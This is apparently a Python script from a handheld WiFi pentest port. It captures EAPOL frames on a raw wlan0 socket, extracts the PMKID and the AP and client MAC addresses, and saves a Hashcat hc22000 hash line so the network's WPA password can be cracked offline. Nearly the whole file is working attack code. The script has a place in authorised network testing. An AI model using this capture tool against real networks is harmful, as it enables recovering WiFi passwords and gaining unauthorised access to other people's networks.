import socket, sys, os, signal

os.system('echo "' + "Running capture script..." + '" > /dev/tty0')

interface = "wlan0"
with open("/storage/.config/system/configs/system.cfg", 'r') as f:
    essid = [x for x in f.read().splitlines() if x
        .startswith("wifi.ssid=")][0].split("=")[1]
# essid = "YOUR_SSID"  # You can use this instead to hardcode SSID
frame_num = 0

# Use WiFi interface to capture packets
rawSocket = socket.socket(socket.AF_PACKET, 
                          socket.SOCK_RAW, 
                          socket.htons(0x0003))
rawSocket.bind((interface, 0x0003))

first_eapol_frame = None
pmkid = None
mac_ap = None
mac_cl = None

def handle_timeout(a, b):
    raise TimeoutError 

# Attempt capture, timeout after 60 seconds
while True:

    signal.signal(signal.SIGALRM, handle_timeout)
    signal.alarm(60) # Timeout after 60 seconds

    try:
        packet = rawSocket.recvfrom(2048)[0]
        frame_body = packet

        # Offset may vary depending on AP. 2 worked when testing with a 
        # TP-Link Archer C1200 v2.0 Router, Firmware Version 2.0.0, but 
        # your setup may require an offset of 0, 4, 6 or something else.
        offset = 2
        eapol_frame = frame_body[offset:]
        frame_num += 1

        if frame_num == 1:
            first_eapol_frame = eapol_frame
            pmkid = eapol_frame[-16:].hex()
            mac_ap = eapol_frame[4:10].hex()

        if frame_num == 2:
            mac_cl = eapol_frame[4:10].hex()
            print("\n1st EAPoL Frame:   \n"+ str(first_eapol_frame)+"\n")
            print('\033[95m')
            print("Possible PMKID:        ", pmkid)
            print("SSID:                  ", essid)
            print("MAC AP:                ", mac_ap)
            print("MAC Client:            ", mac_cl)
            print('\x1b[0m')
            print("\nHashcat hc22000 format hash line:")
            hashline = "WPA*01*"+pmkid+"*"+mac_ap+"*"+mac_cl+\
                "*"+bytes(essid,'utf-8').hex()+"***"
            print(hashline)

            # Save hashline to hashline.txt
            with open(
                '/storage/roms/ports/RG353-WiFi-Pen/hashline.txt', 'w') as f:
                f.write(hashline)
            
            sys.exit()
    except TimeoutError:
        print('\033[91m' + "\nCapture timed out!\n" + '\x1b[0m')
        print("Check SSID and try running the script again.")
        sys.exit()
    finally:
        signal.alarm(0)